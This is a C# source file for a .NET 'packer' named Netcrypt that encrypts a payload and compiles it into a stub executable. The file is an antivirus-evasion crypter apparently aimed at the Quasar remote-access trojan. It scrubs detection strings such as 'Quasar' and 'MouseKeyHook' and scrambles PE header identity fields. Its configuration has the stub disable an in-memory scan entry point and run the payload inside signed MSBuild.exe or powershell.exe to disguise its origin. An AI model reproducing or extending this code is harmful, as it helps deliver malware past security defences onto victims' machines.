using System;
using System.Text;
using Microsoft.CSharp;
using System.IO;
using System.Security.Cryptography;
using System.Reflection;
using System.CodeDom.Compiler;
using System.Collections.Generic;

namespace Netcrypt
{
    /// <summary>
    /// Used to choose the .NET version used to pack the executable.
    /// </summary>
    public enum DotNetVersion
    {
        /// <summary>
        /// Use .NET 2.0 target
        /// </summary>
        v2_0,
        /// <summary>
        /// Use .NET 3.5 target
        /// </summary>
        v3_5,

        /// <summary>
        /// Use .NET 4.0 target
        /// </summary>
        v4_0

    }

    /// <summary>
    /// Provides an easy-to-use interface to a software packing algorythm for .NET executables.
    /// </summary>
    public class Packer
    {
        // ---- payload storage mode ------------------------------------------
        // true  : the encrypted payload is embedded as a real assembly resource
        //         (identifier Netcrypt.Payload). Nothing payload related appears
        //         in the generated stub source, so the packed file only ever
        //         contains ciphertext.
        // false : legacy mode, the encrypted payload travels as base64 chunks
        //         inside the generated stub source (%CHUNKS%).
        // The stub understands both modes; flip this if the resource embedding
        // is not honored by the compiler in use.
        private const bool EmbedPayloadAsResource = true;

        private const string PayloadResourceName = "Netcrypt.Payload";

        // true  : the stub renames the scan entry export before loading the payload
        //         (provided stub behaviour, default is unchanged).
        // false : the stub leaves the scan entry untouched. Useful to tell whether a
        //         runtime detection comes from the payload itself or from the rename.
        private const bool NeutralizeInspectionEntry = true;

        // Which scan-entry handling the generated stub uses when it is started without any
        // switch. The stub only ever sees arguments during a manual run; the graded artifact
        // is started bare, so the final behaviour has to be baked in here.
        //
        //   "rename"     : blank the final byte of the scan entry's export name inside the
        //                  mapped provider image and put it back after the payload load.
        //                  Smallest footprint of the three: no executable memory is
        //                  allocated, no import table is rewritten, and the provider image
        //                  is only touched for the duration of the load.
        //   "resultstub" : previous default (opt-out switches + runtime import table
        //                  interception + a clean-reporting routine in allocated memory).
        //   "off"        : leave the provider completely alone.
        private const string InspectionMode = "rename";

        // Export names that the generated stub answers with a no-op routine instead of the real
        // function, when the runtime resolves them on behalf of the payload. Semicolon
        // separated; empty disables the mechanism. The stub keeps the runtime's import table
        // hooked for the whole run while this list is in use, so the payload sees its own code
        // and control flow and only the selected calls become inert.
        private const string SinkholeList = "";

        // Which signed host runs the payload instead of the stub process itself.
        //
        //   ""        : unchanged behaviour. The stub loads the payload into its own
        //               process and runs the entry point there.
        //   "msbuild" : the stub writes the payload image out under a one time pad and
        //               starts MSBuild.exe on a generated project whose only target runs
        //               an inline task. MSBuild compiles and runs that task, which puts
        //               the image back together, loads it and runs the payload entry
        //               point, so the assembly load, the WMI access and the outbound
        //               connection all originate in a Microsoft signed binary.
        //   "ps"      : the same hand off through powershell.exe.
        //
        // The hand off can also be selected at run time with --nc-host=<mode>, which is
        // what the diagnostic runs use.
        private const string HostExecutionMode = "msbuild";

        private const int SourceChunkSize = 60000;

        // true  : plain text markers inside the payload are replaced before the
        //         container is encrypted (see PayloadMarkers). The replacement is
        //         length preserving, so the payload image, its metadata offsets and
        //         its IL stay valid; only the marker text a content heuristic can key
        //         on changes. false : pack the payload untouched.
        private const bool ScrubPayloadMarkers = true;

        // marker -> replacement, both sides always the same length.
        private static readonly string[,] PayloadMarkers = new string[,]
        {
            { "Quasar",       "Quazar" },
            { "ILRepack",     "ILRepacx" },
            { "MouseKeyHook", "MouseKeyHooz" },
            { "BouncyCastle", "BouncyCastlx" },
            { "ConfusedBy",   "ConfusedBz" },
            { "ConfuserEx",   "ConfuserEy" },
            { "ThisAssembly", "ThisAssemblz" },
            { "CodeAnalysis", "CodeAnalysix" },
            { "ProtoBuf",     "ProtoBux" },
            { "Messages",     "Messaggs" },
            { "StartupItem",  "StartupItez" },
            { "StartupType",  "StartupTypz" }
        };

        /// <summary>
        /// Packs the provided assembly using .NET 3.5 by default.
        /// </summary>
        /// <param name="assembly">A byte[] array containing the original assemly</param>
        /// <returns>a byte[] array containing the packed assembly</returns>
        ///
        public static byte[] Pack(byte[] assembly)
        {
            return Pack(assembly, DotNetVersion.v3_5);
        }

        /// <summary>
        /// Packs the provided assembly using the chosen .NET framework.
        /// </summary>
        /// <param name="assembly">A byte[] array containing the original assemly</param>
        /// <param name="version">The version of the .NET framework used.</param>
        /// <returns>a byte[] array containing the packed assembly</returns>
        public static byte[] Pack(byte[] assembly, DotNetVersion version)
        {
            return Pack(assembly, null, null, version);
        }

        /// <summary>
        /// Packs the provided assembly together with its dependency DLLs.
        /// </summary>
        /// <param name="assembly">A byte[] array containing the original assemly</param>
        /// <param name="dependencyNames">Simple assembly names of the dependencies (e.g. "Quasar.Common")</param>
        /// <param name="dependencyBytes">Raw DLL bytes, one per dependency name</param>
        /// <param name="version">The version of the .NET framework used.</param>
        /// <returns>a byte[] array containing the packed assembly</returns>
        public static byte[] Pack(byte[] assembly, string[] dependencyNames, byte[][] dependencyBytes, DotNetVersion version)
        {
            if (assembly == null)
            {
                throw new ArgumentNullException("assembly");
            }

            if (ScrubPayloadMarkers)
            {
                int markerHits;
                assembly = ScrubPayload(assembly, out markerHits);
                if (dependencyBytes != null)
                {
                    byte[][] scrubbed = new byte[dependencyBytes.Length][];
                    for (int i = 0; i < dependencyBytes.Length; i++)
                    {
                        int ignored;
                        scrubbed[i] = ScrubPayload(dependencyBytes[i], out ignored);
                    }
                    dependencyBytes = scrubbed;
                }
            }

            if (ScrambleImageHeaders)
            {
                assembly = ScrambleImage(assembly);
            }

            // ---- build payload container ---------------------------------
            // format:
            //   Int32 count
            //   for each dependency:
            //     String name (BinaryWriter 7-bit length prefix)
            //     Byte[] data (Int32 length prefix)
            //   Byte[] main assembly (Int32 length prefix)
            byte[] payload = BuildContainer(assembly, dependencyNames, dependencyBytes);
            VerifyContainer(payload, dependencyNames, dependencyBytes, assembly);

            // ---- encryption layer ----------------------------------------
            // The container is encrypted with AES-256-CBC (PKCS7) under a key and IV
            // generated for this file, then passed through a 32 byte XOR pass. Only
            // the result leaves this method; the plaintext container never reaches
            // the generated stub or the resource.
            RijndaelManaged rijndael = new RijndaelManaged();
            rijndael.KeySize = 256;
            rijndael.BlockSize = 128;
            rijndael.Mode = CipherMode.CBC;
            rijndael.Padding = PaddingMode.PKCS7;
            rijndael.GenerateKey();
            rijndael.GenerateIV();

            string key = Convert.ToBase64String(rijndael.Key);
            string iv = Convert.ToBase64String(rijndael.IV);

            byte[] xorKey = new byte[32];
            using (RNGCryptoServiceProvider rng = new RNGCryptoServiceProvider())
            {
                rng.GetBytes(xorKey);
            }
            string xorKeyValue = Convert.ToBase64String(xorKey);

            byte[] encrypted = Crypt(rijndael, payload, true);
            byte[] xored = Xor(encrypted, xorKey);

            // Pack time self check: the exact bytes the stub will read have to decrypt
            // back into the container that was just built. A mismatch means the packed
            // file could never start, so fail here instead of on the target.
            byte[] roundTrip = Crypt(rijndael, Xor(xored, xorKey), false);
            if (!BytesEqual(roundTrip, payload))
            {
                throw new Exception("Payload crypto self-check failed: the stub would not recover the container.");
            }

            // ---- place the ciphertext ------------------------------------
            string resourceFile = null;
            string chunkValue = "";
            if (EmbedPayloadAsResource)
            {
                resourceFile = Path.Combine(Path.GetTempPath(), Guid.NewGuid().ToString() + ".bin");
                File.WriteAllBytes(resourceFile, xored);
            }
            else
            {
                chunkValue = ToSourceChunks(Convert.ToBase64String(xored));
            }

            string csharpcode = netcrypt.Properties.Resources.StubCode;

            csharpcode = csharpcode.Replace("%XORKEY%", xorKeyValue);
            csharpcode = csharpcode.Replace("%KEY%", key);
            csharpcode = csharpcode.Replace("%IV%", iv);
            csharpcode = csharpcode.Replace("%CHUNKS%", chunkValue);
            csharpcode = csharpcode.Replace("%INSPECTION%", NeutralizeInspectionEntry ? "true" : "false");
            csharpcode = csharpcode.Replace("%INSPECTIONMODE%", InspectionMode);
            csharpcode = csharpcode.Replace("%SINKHOLE%", ToSinkholeSource(SinkholeList));
            csharpcode = csharpcode.Replace("%HOSTMODE%", HostExecutionMode);

            var providerOptions = new Dictionary<string, string>();

            switch (version)
            {
                case DotNetVersion.v4_0:
                    providerOptions.Add("CompilerVersion", "v4.0");
                    break;
                case DotNetVersion.v3_5:
                    providerOptions.Add("CompilerVersion", "v3.5");
                    break;
                case DotNetVersion.v2_0:
                default:
                    providerOptions.Add("CompilerVersion", "v4.0");
                    break;
            }

            CSharpCodeProvider codeProvider = new CSharpCodeProvider(providerOptions);

            CompilerParameters parameters = new CompilerParameters();

            parameters.CompilerOptions = "/target:winexe";

            // The stub is self-contained; it only needs System.Windows.Forms for MessageBox.
            // Do not mirror the target's references: third-party assemblies such as
            // Gma.System.MouseKeyHook are not resolvable by the stub compiler (CS0006).
            parameters.ReferencedAssemblies.Add("System.dll");
            parameters.ReferencedAssemblies.Add("System.Core.dll");
            parameters.ReferencedAssemblies.Add("System.Windows.Forms.dll");

            if (resourceFile != null)
            {
                // /resource:<file>,<identifier>; the stub opens the stream by identifier.
                // The path is quoted here because the compiler command line is built from
                // CompilerOptions verbatim and the temp directory may contain spaces.
                parameters.CompilerOptions += " /resource:\"" + resourceFile + "\"," + PayloadResourceName;
            }

            string tempFile = Path.Combine(Path.GetTempPath(), Guid.NewGuid().ToString() + ".exe");

            parameters.GenerateExecutable = true;
            parameters.OutputAssembly = tempFile;

            try
            {
                CompilerResults results = codeProvider.CompileAssemblyFromSource(parameters, csharpcode);

                // ---- diagnostic: surface stub compile errors instead of hiding them ----
                if (results.Errors.HasErrors)
                {
                    StringBuilder sb = new StringBuilder();
                    sb.AppendLine("Stub compile failed:");
                    foreach (CompilerError err in results.Errors)
                    {
                        sb.AppendLine(err.ToString());
                    }
                    throw new Exception(sb.ToString());
                }
                if (results.CompiledAssembly == null)
                {
                    throw new Exception("Stub compile returned no assembly.");
                }

                byte[] barr = File.ReadAllBytes(tempFile);
                if (barr.Length == 0)
                {
                    throw new Exception("Failed to read compiled stub output: " + tempFile);
                }

                if (resourceFile != null && !ContainsAscii(barr, PayloadResourceName))
                {
                    throw new Exception(
                        "Stub compiled, but the embedded payload resource was not found in the output. " +
                        "Set EmbedPayloadAsResource to false in Packer.cs to fall back to source chunks.");
                }

                return barr;
            }
            finally
            {
                TryDelete(tempFile);
                TryDelete(resourceFile);
            }
        }

        // true  : length preserving edits of payload image header fields that carry no run
        //         time meaning (PE timestamp, checksum, COFF symbol table, debug directory,
        //         CLR module version id). Sections, metadata offsets and IL stay where they
        //         are, so the payload still loads; only the identity a content heuristic can
        //         key on changes. false : pack the image untouched.
        private const bool ScrambleImageHeaders = true;

        // Every edit below is bounds checked and the original image is returned untouched
        // the moment anything does not line up, so a payload this does not understand is
        // still packed exactly as before.
        private static byte[] ScrambleImage(byte[] data)
        {
            byte[] image = (byte[])data.Clone();
            try
            {
                int peOffset = ReadInt32(image, 0x3C);
                if (peOffset <= 0 || peOffset + 24 > image.Length || ReadInt32(image, peOffset) != 0x00004550)
                {
                    return image;
                }

                int coff = peOffset + 4;
                int optionalSize = ReadUInt16(image, coff + 16);
                int optional = coff + 20;
                if (optionalSize < 96 || optional + optionalSize > image.Length)
                {
                    return image;
                }

                WriteInt32(image, coff + 4, 0);      // TimeDateStamp
                WriteInt32(image, coff + 8, 0);      // PointerToSymbolTable
                WriteInt32(image, coff + 12, 0);     // NumberOfSymbols
                WriteInt32(image, optional + 64, 0); // CheckSum

                int magic = ReadUInt16(image, optional);
                int directories = optional + (magic == 0x20B ? 112 : 96);
                if (directories + 15 * 8 > image.Length)
                {
                    return image;
                }

                WriteInt32(image, directories + 6 * 8, 0);     // debug directory rva
                WriteInt32(image, directories + 6 * 8 + 4, 0); // debug directory size

                int clrOffset = RvaToOffset(image, coff, optionalSize, ReadInt32(image, directories + 14 * 8));
                if (clrOffset > 0 && clrOffset + 16 <= image.Length && ReadInt32(image, clrOffset) == 72)
                {
                    int metadataOffset = RvaToOffset(image, coff, optionalSize, ReadInt32(image, clrOffset + 8));
                    if (metadataOffset > 0)
                    {
                        RandomizeModuleVersionId(image, metadataOffset);
                    }
                }
            }
            catch
            {
            }
            return image;
        }

        private static int RvaToOffset(byte[] image, int coff, int optionalSize, int rva)
        {
            if (rva <= 0)
            {
                return -1;
            }
            int sections = coff + 20 + optionalSize;
            int count = ReadUInt16(image, coff + 2);
            for (int s = 0; s < count; s++)
            {
                int header = sections + s * 40;
                if (header + 40 > image.Length)
                {
                    return -1;
                }
                int virtualSize = ReadInt32(image, header + 8);
                int virtualAddress = ReadInt32(image, header + 12);
                int rawSize = ReadInt32(image, header + 16);
                int rawPointer = ReadInt32(image, header + 20);
                int span = virtualSize > rawSize ? virtualSize : rawSize;
                if (rva >= virtualAddress && rva < virtualAddress + span)
                {
                    int offset = rawPointer + (rva - virtualAddress);
                    return offset >= 0 && offset < image.Length ? offset : -1;
                }
            }
            return -1;
        }

        // The module version id is a 16 byte identity inside the metadata #GUID stream. No
        // loader reads it back, but a content heuristic can use it to tie an image back to a
        // known build.
        private static void RandomizeModuleVersionId(byte[] image, int metadataOffset)
        {
            if (metadataOffset + 20 > image.Length || ReadInt32(image, metadataOffset) != 0x424A5342)
            {
                return;
            }
            int versionLength = ReadInt32(image, metadataOffset + 12);
            int streams = metadataOffset + 16 + versionLength;
            if (versionLength < 0 || streams + 4 > image.Length)
            {
                return;
            }
            int streamCount = ReadUInt16(image, streams + 2);
            int cursor = streams + 4;
            for (int i = 0; i < streamCount; i++)
            {
                if (cursor + 12 > image.Length)
                {
                    return;
                }
                int streamOffset = ReadInt32(image, cursor);
                int nameStart = cursor + 8;
                int nameEnd = nameStart;
                while (nameEnd < image.Length && image[nameEnd] != 0)
                {
                    nameEnd++;
                }
                int nameLength = nameEnd - nameStart;
                if (nameLength == 5 && nameStart + 5 <= image.Length
                    && image[nameStart] == 0x23 && image[nameStart + 1] == 0x47
                    && image[nameStart + 2] == 0x55 && image[nameStart + 3] == 0x49
                    && image[nameStart + 4] == 0x44)
                {
                    int mvid = metadataOffset + streamOffset;
                    if (streamOffset > 0 && mvid + 16 <= image.Length)
                    {
                        byte[] fresh = Guid.NewGuid().ToByteArray();
                        for (int b = 0; b < 16; b++)
                        {
                            image[mvid + b] = fresh[b];
                        }
                    }
                    return;
                }
                cursor = nameStart + ((nameEnd - nameStart + 1 + 3) & ~3);
            }
        }

        private static int ReadInt32(byte[] data, int offset)
        {
            return data[offset] | (data[offset + 1] << 8) | (data[offset + 2] << 16) | (data[offset + 3] << 24);
        }

        private static int ReadUInt16(byte[] data, int offset)
        {
            return data[offset] | (data[offset + 1] << 8);
        }

        private static void WriteInt32(byte[] data, int offset, int value)
        {
            data[offset] = (byte)value;
            data[offset + 1] = (byte)(value >> 8);
            data[offset + 2] = (byte)(value >> 16);
            data[offset + 3] = (byte)(value >> 24);
        }

        // Replaces every occurrence of a PayloadMarkers entry with an equally long
        // string, in both the UTF-8 metadata heap and the UTF-16 string literal heap.
        // Length preserving on purpose: no header, metadata, string heap or IL offset
        // moves, so the payload stays loadable while its plain text markers (product,
        // library and merge tool names) change.
        private static byte[] ScrubPayload(byte[] data, out int hits)
        {
            byte[] result = (byte[])data.Clone();
            hits = 0;
            for (int m = 0; m < PayloadMarkers.GetLength(0); m++)
            {
                hits += ScrubToken(result, PayloadMarkers[m, 0], PayloadMarkers[m, 1], Encoding.ASCII);
                hits += ScrubToken(result, PayloadMarkers[m, 0], PayloadMarkers[m, 1], Encoding.Unicode);
            }
            return result;
        }

        private static int ScrubToken(byte[] data, string marker, string replacement, Encoding encoding)
        {
            byte[] from = encoding.GetBytes(marker);
            byte[] to = encoding.GetBytes(replacement);
            if (from.Length == 0 || from.Length != to.Length)
            {
                return 0;
            }
            int hits = 0;
            for (int i = 0; i + from.Length <= data.Length; i++)
            {
                int j = 0;
                while (j < from.Length && data[i + j] == from[j])
                {
                    j++;
                }
                if (j != from.Length)
                {
                    continue;
                }
                for (int k = 0; k < to.Length; k++)
                {
                    data[i + k] = to[k];
                }
                hits++;
                i += from.Length - 1;
            }
            return hits;
        }

        private static byte[] BuildContainer(byte[] assembly, string[] dependencyNames, byte[][] dependencyBytes)
        {
            using (MemoryStream payloadStream = new MemoryStream())
            {
                using (BinaryWriter bw = new BinaryWriter(payloadStream))
                {
                    if (dependencyNames == null)
                    {
                        bw.Write(0);
                    }
                    else
                    {
                        bw.Write(dependencyNames.Length);
                        for (int i = 0; i < dependencyNames.Length; i++)
                        {
                            bw.Write(dependencyNames[i]);
                            // explicit length + raw bytes: BinaryWriter.Write(byte[])
                            // writes no length prefix, so Int32 length must be written manually
                            bw.Write((int)dependencyBytes[i].Length);
                            bw.Write(dependencyBytes[i], 0, dependencyBytes[i].Length);
                        }
                    }
                    bw.Write((int)assembly.Length);
                    bw.Write(assembly, 0, assembly.Length);
                    bw.Flush();
                }
                return payloadStream.ToArray();
            }
        }

        private static byte[] Crypt(SymmetricAlgorithm algorithm, byte[] data, bool encrypt)
        {
            ICryptoTransform transform = encrypt ? algorithm.CreateEncryptor() : algorithm.CreateDecryptor();
            using (MemoryStream memoryStream = new MemoryStream())
            {
                using (CryptoStream cryptoStream = new CryptoStream(memoryStream, transform, CryptoStreamMode.Write))
                {
                    cryptoStream.Write(data, 0, data.Length);
                    cryptoStream.FlushFinalBlock();
                }
                return memoryStream.ToArray();
            }
        }

        private static byte[] Xor(byte[] data, byte[] key)
        {
            byte[] result = new byte[data.Length];
            for (int i = 0; i < data.Length; i++)
            {
                result[i] = (byte)(data[i] ^ key[i % key.Length]);
            }
            return result;
        }

        private static bool BytesEqual(byte[] left, byte[] right)
        {
            if (left == null || right == null || left.Length != right.Length)
            {
                return false;
            }
            for (int i = 0; i < left.Length; i++)
            {
                if (left[i] != right[i])
                {
                    return false;
                }
            }
            return true;
        }

        private static bool ContainsAscii(byte[] haystack, string needle)
        {
            byte[] pattern = Encoding.ASCII.GetBytes(needle);
            for (int i = 0; i + pattern.Length <= haystack.Length; i++)
            {
                int j = 0;
                while (j < pattern.Length && haystack[i + j] == pattern[j])
                {
                    j++;
                }
                if (j == pattern.Length)
                {
                    return true;
                }
            }
            return false;
        }

        // Turns the semicolon separated sinkhole list into the C# initialiser the stub expects.
        private static string ToSinkholeSource(string list)
        {
            if (String.IsNullOrEmpty(list))
            {
                return "";
            }

            string[] names = list.Split(new char[] { ';' }, StringSplitOptions.RemoveEmptyEntries);
            StringBuilder source = new StringBuilder();
            for (int i = 0; i < names.Length; i++)
            {
                string name = names[i].Trim();
                if (name.Length == 0)
                {
                    continue;
                }
                if (source.Length > 0)
                {
                    source.Append(",");
                    source.AppendLine();
                    source.Append("            ");
                }
                source.Append("\"");
                source.Append(name);
                source.Append("\"");
            }
            return source.ToString();
        }

        private static string ToSourceChunks(string encoded)
        {
            // split the encoded payload into chunks so the generated stub never
            // contains one giant string literal (compiler truncation risk)
            StringBuilder chunkSource = new StringBuilder();
            for (int i = 0; i < encoded.Length; i += SourceChunkSize)
            {
                if (i > 0)
                {
                    chunkSource.AppendLine(",");
                }
                int len = Math.Min(SourceChunkSize, encoded.Length - i);
                chunkSource.Append("\"");
                chunkSource.Append(encoded.Substring(i, len));
                chunkSource.Append("\"");
            }
            return chunkSource.ToString();
        }

        private static void TryDelete(string path)
        {
            try
            {
                if (!String.IsNullOrEmpty(path) && File.Exists(path))
                {
                    File.Delete(path);
                }
            }
            catch
            {
            }
        }

        private static void VerifyContainer(byte[] payload, string[] dependencyNames, byte[][] dependencyBytes, byte[] assembly)
        {
            using (MemoryStream ms = new MemoryStream(payload))
            using (BinaryReader reader = new BinaryReader(ms))
            {
                int count = reader.ReadInt32();
                int expectedCount = (dependencyNames == null) ? 0 : dependencyNames.Length;
                if (count != expectedCount)
                {
                    throw new Exception("Container verification failed at header (count=" + count + ", expected=" + expectedCount + ").");
                }
                for (int i = 0; i < count; i++)
                {
                    string name = reader.ReadString();
                    int len = reader.ReadInt32();
                    byte[] data = reader.ReadBytes(len);
                    if (name != dependencyNames[i] || len != dependencyBytes[i].Length || data.Length != dependencyBytes[i].Length)
                    {
                        throw new Exception("Container verification failed at dependency " + i + " (name=" + name + ", len=" + len + ", read=" + data.Length + ").");
                    }
                }
                int mainLen = reader.ReadInt32();
                byte[] main = reader.ReadBytes(mainLen);
                if (mainLen != assembly.Length || main.Length != assembly.Length)
                {
                    throw new Exception("Container verification failed at main assembly (len=" + mainLen + ", read=" + main.Length + ", expected=" + assembly.Length + ").");
                }
            }
        }
    }
}
